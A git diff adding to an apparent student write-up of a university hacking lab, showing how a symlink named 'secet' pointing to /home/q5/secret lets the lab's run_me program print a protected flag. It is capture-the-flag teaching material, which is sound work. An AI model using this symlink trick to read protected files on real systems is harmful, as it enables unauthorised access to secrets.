@@ -131,7 +131,30 @@ $1 = {void ()} 0x565561fd \<secret>
 > Go to /home/q5/. Exploit the program to get the secret.
 > 
 > **Answer:**
-> This one is straightforward - create a `symlink`  
+> This one is straightforward - since we don't have permissions to create a file inside `/q5`, we can create a `symlink` to the `secret` file from `secet` contained in `~` and run the script inside `~`.
+> 
+> ```
+> student@hacklabvm:~$ ln -s /home/q5/secret ./secet
+student@hacklabvm:~$ ls -l
+lrwxrwxrwx  1 student student   15 Mar 28 03:58 secet -> /home/q5/secret
+> ...
+>```
+>
+>```
+>student@hacklabvm:~$ ../q5/run_me
+> _________________________________________
+>/ csf2024s1_{phalangitic-utfangethef-cano \
+>\ nicate}                                 /
+> -----------------------------------------
+>  \
+>   \
+>       __     
+>      UooU\.'@@@@@@`.
+>      \__/(@@@@@@@@@@)
+>           (@@@@@@@@)
+>           `YY~~~~YY'
+>            ||    ||
+>```
 
 
 
